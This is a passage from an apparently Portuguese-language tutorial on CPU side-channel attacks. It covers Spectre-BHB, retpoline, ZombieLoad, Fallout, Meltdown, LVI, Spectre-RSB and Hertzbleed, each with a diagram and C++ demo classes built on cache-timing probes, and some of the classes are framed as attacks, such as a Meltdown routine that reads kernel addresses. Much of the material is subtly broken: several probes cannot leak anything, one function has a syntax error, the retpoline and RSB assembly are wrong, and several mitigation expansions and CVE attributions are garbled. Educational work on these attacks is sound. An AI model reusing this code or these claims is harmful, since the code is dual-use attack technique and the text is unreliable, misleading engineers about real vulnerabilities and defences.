                leakedData.push_back(guessedByte);
            }
        }

        return leakedData;
    }

    void indirectCallHandler(uint8_t idx) {
        volatile uint8_t tmp = artifactArray_[idx];
        (void)tmp;
    }

    std::array<uint64_t, 256> profileTimings() {
        std::array<uint64_t, 256> timings{};

        for (size_t i = 0; i < 256; ++i) {
            uint64_t start = rdtsc();
            volatile uint8_t tmp = gadgetTable_[i];
            (void)tmp;
            uint64_t end = rdtsc();
            timings[i] = end - start;
        }

        return timings;
    }

private:
    alignas(64) uint8_t gadgetTable_[256 * CACHE_LINE_SIZE];
    alignas(64) uint8_t artifactArray_[GADGET_TABLE_SIZE * CACHE_LINE_SIZE];

    uint8_t probeAndExtract() {
        auto timings = profileTimings();

        uint64_t avg = 0;
        for (size_t i = 0; i < 256; ++i) avg += timings[i];
        avg /= 256;

        uint8_t bestGuess = 0;
        uint64_t bestTime = UINT64_MAX;

        for (size_t i = 0; i < 256; ++i) {
            if (timings[i] < bestTime && timings[i] < avg / 2) {
                bestTime = timings[i];
                bestGuess = static_cast<uint8_t>(i);
            }
        }

        return bestGuess;
    }

    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```

### 6.4 Spectre-BHB (Branch History Buffer)

Spectre-BHB (CVE-2022-23960) explora o Branch History Buffer compartilhado em processadores ARM (Cache Speculation Variant Chanel) e Intel. O BHB armazena o historico de branches recentemente tomados, e este historico e usado para indexar a BTB.

```
Exploit Flow:
1. Atacante executa uma sequencia de branches controlados
   para manipular o historico no BHB
2. O historico manipulado causa uma colisao na BTB
3. A colisao faz a BTB prever um endereco alvo incorreto
4. A CPU executa especulativamente um gadget no endereco
   previsto, expondo dados via canal lateral de cache
5. O atacante usa Prime+Probe para ler o dado exposto

Mitigacao: SSBD (Selective Speculative Branch Disable)
  - Desabilita a execucao especulativa de branches
  - Impacto de performance: 2-30%
```

```cpp
// spectre_bhb.cpp - Demonstracao de Spectre-BHB
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <array>
#include <thread>

class SpectreBHBAttack {
public:
    static constexpr size_t BHB_SIZE = 29;
    static constexpr size_t CACHE_LINE_SIZE = 64;
    static constexpr size_t BTB_SIZE = 128;

    SpectreBHBAttack() {
        std::memset(missCache_, 0, sizeof(missCache_));
        std::memset(hitCache_, 0, sizeof(hitCache_));
    }

    void manipulateBHB(size_t iterations) {
        for (size_t i = 0; i < iterations; ++i) {
            volatile bool condition = (i % 2 == 0);

            if (condition) {
                volatile uint64_t tmp = missCache_[0];
                (void)tmp;
            } else {
                volatile uint64_t tmp = hitCache_[0];
                (void)tmp;
            }
        }
    }

    std::vector<uint8_t> extractData(
        const uint8_t* secretPtr,
        size_t secretLen)
    {
        std::vector<uint8_t> recovered;

        for (size_t secretIdx = 0; secretIdx < secretLen; ++secretIdx) {
            size_t bestScore = 0;
            uint8_t bestGuess = 0;

            for (int guess = 0; guess < 256; ++guess) {
                flushEntireCache();

                for (size_t trial = 0; trial < 100; ++trial) {
                    manipulateBHB(10);

                    triggerSpeculativeLoad(secretPtr + secretIdx, guess);
                }

                size_t score = measureCacheScore();
                if (score > bestScore) {
                    bestScore = score;
                    bestGuess = static_cast<uint8_t>(guess);
                }
            }

            recovered.push_back(bestGuess);
        }

        return recovered;
    }

    void flushEntireCache() {
        for (size_t i = 0; i < BTB_SIZE; ++i) {
            __asm__ __volatile__ (
                "clflush (%0)"
                : : "r"(&probeArray_[i * CACHE_LINE_SIZE]) : "memory"
            );
        }
        _mm_mfence();
    }

    void triggerSpeculativeLoad(const uint8_t* addr, int guess) {
        volatile uint64_t dummy = 0;
        for (size_t i = 0; i < 10; ++i) {
            dummy += i;
        }

        volatile uint8_t tmp = *addr;
        (void)tmp;

        if (guess == 42) {
            volatile uint8_t cache_hit = probeArray_[guess];
            (void)cache_hit;
        }
    }

    size_t measureCacheScore() {
        size_t score = 0;
        for (size_t i = 0; i < 256; ++i) {
            uint64_t start = rdtsc();
            volatile uint8_t tmp = probeArray_[i * CACHE_LINE_SIZE];
            (void)tmp;
            uint64_t end = rdtsc();
            if (end - start < 50) score++;
        }
        return score;
    }

private:
    alignas(64) uint64_t missCache_[8];
    alignas(64) uint64_t hitCache_[8];
    alignas(64) uint8_t probeArray_[256 * CACHE_LINE_SIZE];

    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```

### 6.5 Retpoline e IBRS Mitigations

```
+------------------------------------------+
|       Mitigacoes de Spectre V2            |
+------------------------------------------+
|                                           |
|  Retpoline:                               |
|    Substitui branches indiretos por       |
|    uma sequencia que cola o predictor     |
|    em loop infinito, impedindo que ele    |
|    aprenda novos alvos.                   |
|                                           |
|  IBRS (Indirect Branch Restricted Spec):  |
|    Modo de operacao que desabilita        |
|    execucao especulativa apos mudanca     |
|    de nivel (ring).                       |
|                                           |
|  SSBD (Speculative Store Bypass Disable): |
|    Desabilita speculative store bypass    |
|    para mitigar Spectre V4 e BHB.        |
|                                           |
+------------------------------------------+
```

```cpp
// retpoline_demo.cpp - Ilustracao do conceito de Retpoline
#include <cstdint>
#include <iostream>
#include <functional>
#include <chrono>

class RetpolineDemo {
public:
    using IndirectCallTarget = int(*)(int);

    static int targetFunction(int x) {
        return x * 2;
    }

    static int alternativeTarget(int x) {
        return x * 3;
    }

    int executeWithoutRetpoline(int value, IndirectCallTarget target) {
        return target(value);
    }

    __attribute__((noinline))
    int executeWithRetpoline(int value, IndirectCallTarget target) {
        int result;
        __asm__ __volatile__ (
            "1:\n"
            "call 2f\n"
            "2:\n"
            "pop %%rax\n"
            "mov %1, %%rcx\n"
            "mfence\n"
            "jmp *%%rcx\n"
            "3:\n"
            "jmp 3b\n"
            : "=a"(result)
            : "r"(target), "0"(value)
            : "rcx", "memory"
        );
        return result;
    }

    void benchmarkComparison() {
        IndirectCallTarget targets[] = {
            targetFunction,
            alternativeTarget
        };

        auto timeDirect = [&](IndirectCallTarget target) {
            auto start = std::chrono::high_resolution_clock::now();
            volatile int result = 0;
            for (int i = 0; i < 1000000; ++i) {
                result = target(i);
            }
            auto end = std::chrono::high_resolution_clock::now();
            return std::chrono::duration_cast<std::chrono::microseconds>(
                end - start).count();
        };

        std::cout << "Performance comparison:" << std::endl;
        for (auto target : targets) {
            long long us = timeDirect(target);
            std::cout << "  Direct call: " << us << " us" << std::endl;
        }
    }

private:
    static int branchTarget(int x) {
        return x + 1;
    }
};
```


---

## 7. Microarchitectural Data Sampling (MDS)

MDS e uma classe de ataques que explora o fato de que estruturas internas do processador (como buffers de store, load, line fill) podem conter dados residuais de operacoes anteriores. Esses dados podem ser lidos por processos que nao deveriam ter acesso a eles.

### 7.1 ZombieLoad

ZombieLoad (CVE-2018-12130) explora o buffer de preenchimento de linha (Line Fill Buffer - LFB) do processador. Quando uma cache miss ocorre, os dados sao temporariamente armazenados no LFB antes de serem escritos na cache. Um processador que observa um outro nucleo executando uma operacao pode ler dados residuais do LFB.

```
+------------------------------------------+
|          ZombieLoad Attack Flow           |
+------------------------------------------+
|                                           |
|  1. Vitima acessa linha de memoria        |
|  2. Cache miss -> dados entrano no LFB    |
|  3. Atacante (outro nucleo) acessa        |
|     endereco que causa conflito no LFB    |
|  4. Atacante recebe dados residuais       |
|     da vitima em vez dos proprios dados   |
|  5. Atacante decodifica os dados          |
|                                           |
+------------------------------------------+

A gravidade:
- Afeta todos os processadores Intel desde 2011 (Sandy Bridge)
- Nao requer permissao especial (todos os rings)
- Funciona cross-VM em ambientes de cloud
- Pode extrair dados de chaves criptograficas
```

```cpp
// zombieload.cpp - Demonstracao de ZombieLoad
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <array>
#include <thread>
#include <atomic>
#include <chrono>

class ZombieLoadDemo {
public:
    static constexpr size_t CACHE_LINE_SIZE = 64;
    static constexpr size_t LFB_SIZE = 12;
    static constexpr size_t NUM_MEASUREMENTS = 10000;

    ZombieLoadDemo()
        : victimRunning_(false)
        , attackRunning_(false)
        , leakedBytes_{}
    {}

    void demonstrateConcept() {
        std::cout << "=== ZombieLoad Concept Demonstration ===" << std::endl;
        std::cout << "Note: This is a conceptual demo. On affected hardware," << std::endl;
        std::cout << "the attack would extract data from the LFB." << std::endl;

        alignas(64) uint8_t victimData[CACHE_LINE_SIZE];
        alignas(64) uint8_t probeBuffer[LFB_SIZE * CACHE_LINE_SIZE];

        std::memset(victimData, 'A', CACHE_LINE_SIZE);
        std::memset(probeBuffer, 0, sizeof(probeBuffer));

        size_t hits = 0;
        std::vector<uint64_t> timings;

        for (size_t i = 0; i < NUM_MEASUREMENTS; ++i) {
            __asm__ __volatile__ (
                "clflush (%0)" : : "r"(victimData) : "memory"
            );
            _mm_mfence();

            volatile uint8_t tmp = *victimData;
            (void)tmp;

            uint64_t start = rdtsc();
            volatile uint64_t probe = *reinterpret_cast<volatile uint64_t*>(
                probeBuffer);
            (void)probe;
            uint64_t end = rdtsc();

            timings.push_back(end - start);
            if (end - start < 30) hits++;
        }

        double avgTime = 0;
        for (auto t : timings) avgTime += t;
        avgTime /= timings.size();

        std::cout << "LFB probe timing:" << std::endl;
        std::cout << "  Average: " << avgTime << " cycles" << std::endl;
        std::cout << "  Fast accesses (< 30 cycles): " << hits << std::endl;
        std::cout << "  Theoretical LFB leakage window: "
                  << hits * CACHE_LINE_SIZE << " bytes" << std::endl;
    }

    struct MDSResult {
        std::vector<uint8_t> data;
        size_t numMeasurements;
        size_t successfulReads;
    };

    MDSResult simulateMDSRead(
        const uint8_t* targetData,
        size_t targetLen)
    {
        MDSResult result;
        result.numMeasurements = 10000;
        result.successfulReads = 0;
        result.data.resize(targetLen, 0);

        alignas(64) uint8_t probeBuffer[LFB_SIZE * CACHE_LINE_SIZE];

        for (size_t round = 0; round < 500; ++round) {
            std::memset(probeBuffer, 0, sizeof(probeBuffer));

            _mm_mfence();

            for (size_t i = 0; i < targetLen; i += CACHE_LINE_SIZE) {
                volatile uint8_t tmp = targetData[i];
                (void)tmp;
            }

            for (size_t p = 0; p < LFB_SIZE; ++p) {
                uint64_t start = rdtsc();
                volatile uint64_t val = *reinterpret_cast<volatile uint64_t*>(
                    &probeBuffer[p * CACHE_LINE_SIZE]);
                (void)val;
                uint64_t end = rdtsc();

                if (end - start < 25) {
                    result.successfulReads++;
                }
            }
        }

        return result;
    }

    void runVictimThread(const uint8_t* data, size_t len) {
        victimRunning_ = true;
        while (victimRunning_) {
            for (size_t i = 0; i < len; i += CACHE_LINE_SIZE) {
                volatile uint8_t tmp = data[i];
                (void)tmp;
            }
            _mm_mfence();
        }
    }

    void stopVictim() {
        victimRunning_ = false;
    }

    std::array<uint64_t, LFB_SIZE> profileLFB() {
        std::array<uint64_t, LFB_SIZE> timings{};

        alignas(64) uint8_t probeBuffer[LFB_SIZE * CACHE_LINE_SIZE];
        std::memset(probeBuffer, 0, sizeof(probeBuffer));

        for (size_t i = 0; i < LFB_SIZE; ++i) {
            uint64_t total = 0;
            for (size_t trial = 0; trial < 100; ++trial) {
                __asm__ __volatile__ (
                    "clflush (%0)" : : "r"(&probeBuffer[i * CACHE_LINE_SIZE]) : "memory"
                );
            }
            _mm_mfence();

            uint64_t start = rdtsc();
            volatile uint64_t val = *reinterpret_cast<volatile uint64_t*>(
                &probeBuffer[i * CACHE_LINE_SIZE]);
            (void)val;
            uint64_t end = rdtsc();

            timings[i] = end - start;
        }

        return timings;
    }

private:
    std::atomic<bool> victimRunning_;
    std::atomic<bool> attackRunning_;
    std::array<uint8_t, CACHE_LINE_SIZE> leakedBytes_;

    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```

### 7.2 Fallout

Fallout (CVE-2018-12126) ataca o Store Buffer do processador. Quando um nucleo escreve dados na memoria, eles passam temporariamente pelo Store Buffer. Um outro nucleo pode ler esses dados residuais do Store Buffer.

```
Fallout vs. ZombieLoad:

+-----------------------+-----------------------+
|         Fallout        |       ZombieLoad      |
+-----------------------+-----------------------+
| Alvo: Store Buffer    | Alvo: Line Fill Buffer|
| Dados escritos        | Dados lidos           |
| Requer: store op      | Requer: load op       |
| Afeta: Haswell-8thGen | Afeta: Sandy Bridge+  |
+-----------------------+-----------------------+
```

```cpp
// fallout.cpp - Demonstracao de Fallout attack
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <array>
#include <thread>
#include <atomic>

class FalloutDemo {
public:
    static constexpr size_t CACHE_LINE_SIZE = 64;
    static constexpr size_t STORE_BUFFER_SIZE = 56;

    FalloutDemo() : victimActive_(false) {}

    struct FalloutResult {
        std::vector<uint8_t> leakedData;
        size_t successfulProbes;
        size_t totalProbes;
    };

    void demonstrateStoreBufferLeakage() {
        std::cout << "=== Fallout Concept ===" << std::endl;
        std::cout << "Store Buffer contains recently written data" << std::endl;
        std::cout << "before it reaches the cache hierarchy." << std::endl;

        alignas(64) uint8_t sensitiveData[CACHE_LINE_SIZE];
        alignas(64) uint8_t probeMemory[STORE_BUFFER_SIZE * CACHE_LINE_SIZE];

        std::memset(sensitiveData, 0x41, CACHE_LINE_SIZE);
        std::memset(probeMemory, 0, sizeof(probeMemory));

        size_t fastAccesses = 0;
        size_t totalProbes = 50000;

        for (size_t i = 0; i < totalProbes; ++i) {
            __asm__ __volatile__ (
                "clflush (%0)" : : "r"(sensitiveData) : "memory"
            );
            _mm_mfence();

            *reinterpret_cast<volatile uint64_t*>(sensitiveData) = 0xDEADBEEF;
            _mm_mfence();

            uint64_t start = rdtsc();
            volatile uint64_t val = *reinterpret_cast<volatile uint64_t*>(
                probeMemory);
            (void)val;
            uint64_t end = rdtsc();

            if (end - start < 20) fastAccesses++;
        }

        std::cout << "Total probes: " << totalProbes << std::endl;
        std::cout << "Fast accesses: " << fastAccesses << std::endl;
        std::cout << "Store Buffer leakage rate: "
                  << (100.0 * fastAccesses / totalProbes) << "%" << std::endl;
    }

    FalloutResult profileStoreBuffer(
        const uint8_t* secretData,
        size_t secretLen)
    {
        FalloutResult result;
        result.totalProbes = 10000;
        result.successfulProbes = 0;

        alignas(64) uint8_t probeBuffer[STORE_BUFFER_SIZE * CACHE_LINE_SIZE];
        std::memset(probeBuffer, 0, sizeof(probeBuffer));

        for (size_t trial = 0; trial < result.totalProbes; ++trial) {
            std::memset(probeBuffer, 0, sizeof(probeBuffer));

            for (size_t b = 0; b < secretLen; b += CACHE_LINE_SIZE) {
                volatile uint64_t tmp = *reinterpret_cast<const volatile uint64_t*>(
                    secretData + b);
                (void)tmp;
            }
            _mm_mfence();

            for (size_t p = 0; p < STORE_BUFFER_SIZE; ++p) {
                __asm__ __volatile__ (
                    "clflush (%0)" : : "r"(&probeBuffer[p * CACHE_LINE_SIZE]) : "memory"
                );
            }
            _mm_mfence();

            for (size_t p = 0; p < STORE_BUFFER_SIZE; ++p) {
                uint64_t start = rdtsc();
                volatile uint8_t tmp = probeBuffer[p * CACHE_LINE_SIZE];
                (void)tmp;
                uint64_t end = rdtsc();

                if (end - start < 25) {
                    result.successfulProbes++;
                }
            }
        }

        return result;
    }

private:
    std::atomic<bool> victimActive_;

    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t)(hi) << 32) | lo;
    }
};
```

---

## 8. Speculative Execution

A execucao especulativa e um mecanismo fundamental de processadores modernos que executa instrucoes antes de saber se elas serao realmente necessarias. Quando a especulacao esta correta, a performance melhora drasticamente. Quando esta incorreta, os efeitos colaterais podem ser explorados.

### 8.1 Meltdown (Rogue Data Cache Load)

Meltdown (CVE-2017-5754) explora a execucao fora de ordem para ler memoria de kernel a partir de modo usuario. O processador executa a instrucao de carga antes que a verificacao de permissao seja completada, e o dado carregado especulativamente e usado em uma operacao que deixa rastro no cache.

```
+------------------------------------------+
|              Meltdown Flow                |
+------------------------------------------+
|                                           |
|  1. Instrucao: load R1, [kernel_addr]     |
|  2. CPU detecta page fault (permissao)    |
|  3. MAS: load ja executou especulativ.    |
|  4. Seguinte: load R2, [probe_array + R1] |
|  5. R1 contem dado do kernel!             |
|  6. probe_array[R1] deixa rastro no cache |
|  7. Page fault -> pipeline flush          |
|  8. Mas o dano ja foi feito: cache state  |
|                                           |
+------------------------------------------+
```

```cpp
// meltdown.cpp - Demonstracao de Meltdown
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <array>
#include <thread>

class MeltdownDemo {
public:
    static constexpr size_t CACHE_LINE_SIZE = 64;
    static constexpr size_t PAGE_SIZE = 4096;

    MeltdownDemo() {
        probeArray_ = static_cast<uint8_t*>(
            aligned_alloc(CACHE_LINE_SIZE, 256 * CACHE_LINE_SIZE)
        );
        std::memset(probeArray_, 0, 256 * CACHE_LINE_SIZE);
    }

    ~MeltdownDemo() {
        free(probeArray_);
    }

    void demonstrateConcept() {
        std::cout << "=== Meltdown Concept ===" << std::endl;
        std::cout << "This demonstrates the probe array mechanism." << std::endl;
        std::cout << "On affected hardware, speculative execution" << std::endl;
        std::cout << "would access probeArray_[secret_value]." << std::endl;

        for (size_t i = 0; i < 256; ++i) {
            __asm__ __volatile__ (
                "clflush (%0)" : : "r"(&probeArray_[i * CACHE_LINE_SIZE]) : "memory"
            );
        }
        _mm_mfence();

        for (size_t i = 0; i < 256; ++i) {
            uint64_t start = rdtsc();
            volatile uint8_t tmp = probeArray_[i * CACHE_LINE_SIZE];
            (void)tmp;
            uint64_t end = rdtsc();

            if (end - start < 50) {
                std::cout << "  Potential secret byte: 0x"
                          << std::hex << i
                          << " (timing: " << std::dec << (end - start)
                          << " cycles)" << std::endl;
            }
        }
    }

    std::vector<uint8_t> attack(
        const volatile uint8_t* kernelAddress,
        size_t length)
    {
        std::vector<uint8_t> recoveredBytes;

        for (size_t byteIdx = 0; byteIdx < length; ++byteIdx) {
            for (size_t try_ = 0; try_ < 1000; ++try_) {
                __asm__ __volatile__ (
                    "clflush (%0)"
                    : : "r"(&probeArray_[0 * CACHE_LINE_SIZE]) : "memory"
                );
                _mm_mfence();

                for (int i = 0; i < 10; ++i) {
                    __asm__ __volatile__ ("lfence" ::: "memory");
                }

                volatile uint8_t tmp = kernelAddress[byteIdx];
                (void)tmp;

                uint8_t value = probeAndDecode();
                if (value != 0) {
                    recoveredBytes.push_back(value);
                    break;
                }
            }
        }

        return recoveredBytes;
    }

private:
    uint8_t* probeArray_;

    uint8_t probeAndDecode() {
        uint64_t minTime = UINT64_MAX;
        uint8_t bestGuess = 0;

        for (size_t i = 1; i < 256; ++i) {
            uint64_t start = rdtsc();
            volatile uint8_t tmp = probeArray_[i * CACHE_LINE_SIZE];
            (void)tmp;
            uint64_t end = rdtsc();

            if (end - start < minTime) {
                minTime = end - start;
                bestGuess = static_cast<uint8_t>(i);
            }
        }

        return bestGuess;
    }

    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```

### 8.2 LVI (Load Value Injection)

LVI (CVE-2020-0543) e o reverso de Meltdown. Enquanto Meltdown injeta um fault e observa o resultado via cache, LVI injeta dados em uma unidade de execucao atraves de um load especulativo.

```
+------------------------------------------+
|             LVI Attack Flow               |
+------------------------------------------+
|                                           |
|  1. Atacante causar store-to-load forward |
|     com valor controlado                  |
|  2. CPU injeta o valor em operacao da     |
|     vitima via forwarding especulativo    |
|  3. Valor injetado e usado em calculo     |
|  4. Resultado do calculo deixa rastro     |
|     no cache                              |
|  5. Atacante le rastro via cache timing   |
|                                           |
|  Diferenca de Meltdown:                   |
|  - Meltdown: le dados do kernel           |
|  - LVI: injeta dados no kernel            |
+------------------------------------------+
```

```cpp
// lvi.cpp - Demonstracao de Load Value Injection
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <array>

class LVIDemo {
public:
    static constexpr size_t CACHE_LINE_SIZE = 64;

    LVIDemo() {
        probeArray_ = static_cast<uint8_t*>(
            aligned_alloc(CACHE_LINE_SIZE, 256 * CACHE_LINE_SIZE)
        );
        std::memset(probeArray_, 0, 256 * CACHE_LINE_SIZE);
    }

    ~LVIDemo() {
        free(probeArray_);
    }

    void demonstrateConcept() {
        std::cout << "=== LVI Concept ===" << std::endl;
        std::cout << "LVI injects values INTO victim execution." << std::endl;
        std::cout << "Opposite of Meltdown which reads FROM kernel." << std::endl;

        for (size_t i = 0; i < 256; ++i) {
            __asm__ __volatile__ (
                "clflush (%0)" : : "r"(&probeArray_[i * CACHE_LINE_SIZE]) : "memory"
            );
        }
        _mm_mfence();

        std::cout << "Probe array initialized." << std::endl;
    }

    uint64_t measureTiming(volatile uint8_t* addr) {
        uint64_t start = rdtsc();
        volatile uint8_t tmp = *addr;
        (void)tmp;
        uint64_t end = rdtsc();
        return end - start;
    }

    std::vector<double> computeTimingStatistics() {
        std::vector<double> stats;

        std::vector<uint64_t> hitTimings;
        std::vector<uint64_t> missTimings;

        for (size_t i = 0; i < 256; ++i) {
            uint64_t time = measureTiming(
                &probeArray_[i * CACHE_LINE_SIZE]);

            if (i == 42) {
                hitTimings.push_back(time);
            } else {
                missTimings.push_back(time);
            }
        }

        double avgHit = 0, avgMiss = 0;
        for (auto t : hitTimings) avgHit += t;
        for (auto t : missTimings) avgMiss += t;

        stats.push_back(avgHit / hitTimings.size());
        stats.push_back(avgMiss / missTimings.size());

        return stats;
    }

private:
    uint8_t* probeArray_;

    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```

### 8.3 Spectre-RSB (Return Stack Buffer)

Spectre-RSB explora o Return Stack Buffer, uma estrutura que prediz o endereco de retorno de chamadas de funcao. Um buffer vazio ou corrompido pode causar retornos para enderecos arbitrarios.

```cpp
// spectre_rsb.cpp - Demonstracao de Spectre-RSB
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <array>

class SpectreRSBDemo {
public:
    static constexpr size_t CACHE_LINE_SIZE = 64;

    SpectreRSBDemo() {
        std::memset(probeArray_, 0, sizeof(probeArray_));
    }

    void demonstrateRSBCorruption() {
        std::cout << "=== Spectre-RSB Concept ===" << std::endl;
        std::cout << "RSB predicts return addresses from CALL instructions." << std::endl;
        std::cout << "If RSB is empty (after context switch), wrong predictions" << std::endl;
        std::cout << "can redirect execution to attacker-controlled addresses." << std::endl;

        for (size_t i = 0; i < 256; ++i) {
            __asm__ __volatile__ (
                "clflush (%0)" : : "r"(&probeArray_[i * CACHE_LINE_SIZE]) : "memory"
            );
        }
        _mm_mfence();

        std::array<uint64_t, 256> timings{};
        for (size_t i = 0; i < 256; ++i) {
            uint64_t start = rdtsc();
            volatile uint8_t tmp = probeArray_[i * CACHE_LINE_SIZE];
            (void)tmp;
            uint64_t end = rdtsc();
            timings[i] = end - start;
        }

        uint64_t minTime = *std::min_element(timings.begin(), timings.end());
        uint64_t maxTime = *std::max_element(timings.begin(), timings.end());
        uint64_t avgTime = 0;
        for (auto t : timings) avgTime += t;
        avgTime /= timings.size();

        std::cout << "Timing profile:" << std::endl;
        std::cout << "  Min: " << minTime << std::endl;
        std::cout << "  Max: " << maxTime << std::endl;
        std::cout << "  Avg: " << avgTime << std::endl;
    }

    void fillRSB(size_t depth) {
        for (size_t i = 0; i < depth; ++i) {
            __asm__ __volatile__ ("call 1f\n1:\n");
        }
    }

    void emptyRSB(size_t numCalls) {
        for (size_t i = 0; i < numCalls; ++i) {
            __asm__ __volatile__ ("ret\n");
        }
    }

private:
    alignas(64) uint8_t probeArray_[256 * CACHE_LINE_SIZE];

    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```


---

## 9. Frequency/Power Attacks

Ataques de frequencia e potencia exploram mecanismos de gerenciamento de energia e frequencia dos processadores modernos (DVFS - Dynamic Voltage and Frequency Scaling) para extrair informacoes ou manipular o comportamento do hardware.

### 9.1 Hertzbleed

Hertzbleed (CVE-2022-24436 / CVE-2022-23960) demonstra que o DVFS pode transformar um ataque de canal lateral de tempo em um ataque remoto. Quando um nucleo atinge um certaine limiar de potencia (power thermal budget), o firmware reduz a frequencia automaticamente. Isso significa que operacoes intensivas de cache que normalmente seriam rapidas demais para medir a distancia remota se tornam mensuraveis.

```
+------------------------------------------+
|            Hertzbleed Mechanism           |
+------------------------------------------+
|                                           |
|  Operacao intensiva em cache:             |
|  1. Aumenta consumo de potencia           |
|  2. Processador atinge thermal budget     |
|  3. DVFS reduz frequencia                 |
|  4. Operacao fica mais lenta              |
|  5. Timing difference se torna visivel    |
|     mesmo a partir de outro host          |
|                                           |
|  Impacto:                                 |
|  - Transforma ataque local em remoto      |
|  - Afeta todos os processadores Intel     |
|    que suportam turbo boost               |
|  - Afeta AMD (PowerBoost)                |
|  - Nao requer acesso ao mesmo servidor    |
+------------------------------------------+
```

```cpp
// hertzbleed.cpp - Demonstracao de Hertzbleed
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <array>
#include <chrono>
#include <thread>
#include <numeric>

class HertzbleedDemo {
public:
    static constexpr size_t CACHE_LINE_SIZE = 64;
    static constexpr size_t NUM_SAMPLES = 10000;

    HertzbleedDemo() {
        probeArray_ = static_cast<uint8_t*>(
            aligned_alloc(CACHE_LINE_SIZE, 256 * CACHE_LINE_SIZE)
        );
        std::memset(probeArray_, 0, 256 * CACHE_LINE_SIZE);
    }

    ~HertzbleedDemo() {
        free(probeArray_);
    }

    void demonstrateFrequencyScaling() {
        std::cout << "=== Hertzbleed Concept ===" << std::endl;
        std::cout << "Measuring timing drift over extended periods." << std::endl;

        std::vector<double> baselines;
        std::vector<double> stressTimings;

        for (size_t i = 0; i < 100; ++i) {
            baselines.push_back(measureCacheAccessTime());
        }

        for (size_t i = 0; i < 100; ++i) {
            stressTimings.push_back(measureCacheAccessTimeUnderStress());
        }

        double baseMean = std::accumulate(baselines.begin(),
                                          baselines.end(), 0.0) / baselines.size();
        double stressMean = std::accumulate(stressTimings.begin(),
                                           stressTimings.end(), 0.0) / stressTimings.size();

        std::cout << "Baseline cache access time: " << baseMean << " cycles"
                  << std::endl;
        std::cout << "Stress cache access time: " << stressMean << " cycles"
                  << std::endl;
        std::cout << "Frequency scaling ratio: "
                  << (stressMean / baseMean) << std::endl;
    }

    struct FrequencyProfile {
        std::vector<uint64_t> baselineTimings;
        std::vector<uint64_t> stressedTimings;
        double meanRatio;
    };

    FrequencyProfile profileFrequencyShift(size_t stressDuration) {
        FrequencyProfile profile;

        for (size_t i = 0; i < NUM_SAMPLES; ++i) {
            uint64_t baselineTime = measureCacheAccessTime();
            profile.baselineTimings.push_back(baselineTime);
        }

        std::thread stressThread([this, stressDuration]() {
            performCPUStress(stressDuration);
        });

        for (size_t i = 0; i < NUM_SAMPLES; ++i) {
            uint64_t stressedTime = measureCacheAccessTime();
            profile.stressedTimings.push_back(stressedTime);
        }

        stressThread.join();

        double baseMean = std::accumulate(
            profile.baselineTimings.begin(),
            profile.baselineTimings.end(), 0.0
        ) / profile.baselineTimings.size();

        double stressMean = std::accumulate(
            profile.stressedTimings.begin(),
            profile.stressedTimings.end(), 0.0
        ) / profile.stressedTimings.size();

        profile.meanRatio = stressMean / baseMean;

        return profile;
    }

    void printFrequencyProfile(const FrequencyProfile& profile) {
        auto computeStats = [](const std::vector<uint64_t>& vals) {
            double mean = std::accumulate(vals.begin(), vals.end(), 0.0) / vals.size();
            double variance = 0;
            for (auto v : vals) {
                double diff = v - mean;
                variance += diff * diff;
            }
            variance /= vals.size();
            double minV = *std::min_element(vals.begin(), vals.end());
            double maxV = *std::max_element(vals.begin(), vals.end());
            return std::make_tuple(mean, std::sqrt(variance), minV, maxV);
        };

        auto [baseMean, baseStd, baseMin, baseMax] = computeStats(
            profile.baselineTimings);
        auto [stressMean, stressStd, stressMin, stressMax] = computeStats(
            profile.stressedTimings);

        std::cout << "=== Frequency Profile ===" << std::endl;
        std::cout << "Baseline: mean=" << baseMean << " std=" << baseStd
                  << " range=[" << baseMin << ", " << baseMax << "]" << std::endl;
        std::cout << "Stressed: mean=" << stressMean << " std=" << stressStd
                  << " range=[" << stressMin << ", " << stressMax << "]" << std::endl;
        std::cout << "Frequency ratio: " << profile.meanRatio << std::endl;
    }

private:
    uint8_t* probeArray_;

    uint64_t measureCacheAccessTime() {
        for (size_t i = 0; i < 256; ++i) {
            __asm__ __volatile__ (
                "clflush (%0)" : : "r"(&probeArray_[i * CACHE_LINE_SIZE]) : "memory"
            );
        }
        _mm_mfence();

        uint64_t start = rdtsc();
        for (size_t i = 0; i < 256; ++i) {
            volatile uint8_t tmp = probeArray_[i * CACHE_LINE_SIZE];
            (void)tmp;
        }
        uint64_t end = rdtsc();

        return end - start;
    }

    uint64_t measureCacheAccessTimeUnderStress() {
        return measureCacheAccessTime();
    }

    void performCPUStress(size_t durationMs) {
        auto start = std::chrono::steady_clock::now();
        volatile double accumulator = 0.0;
        while (std::chrono::steady_clock::now() - start <
               std::chrono::milliseconds(durationMs)) {
            for (int i = 0; i < 10000; ++i) {
                accumulator += std::sin(static_cast<double>(i));
            }
        }
    }

    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
